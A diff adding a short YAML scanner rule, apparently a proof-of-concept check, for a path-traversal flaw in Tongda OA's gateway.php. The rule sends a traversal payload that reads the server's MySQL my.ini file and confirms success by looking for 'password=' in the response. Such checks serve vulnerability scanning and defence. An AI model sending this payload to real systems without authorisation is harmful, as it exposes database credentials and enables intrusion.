@@ -1,0 +1,10 @@
+name: tongda-path-traversal
+rules:
+  - method: POST
+    path: "/ispirit/interface/gateway.php"
+    body: |
+      json={"url":"/general/../../mysql5/my.ini"}
+    expression: |
+      response.status == 200 && response.body.bcontains(b'[mysql]') && response.body.bcontains(b'password=') && response.headers["content-type"].contains("text/html")
+detail:
+  author: 666
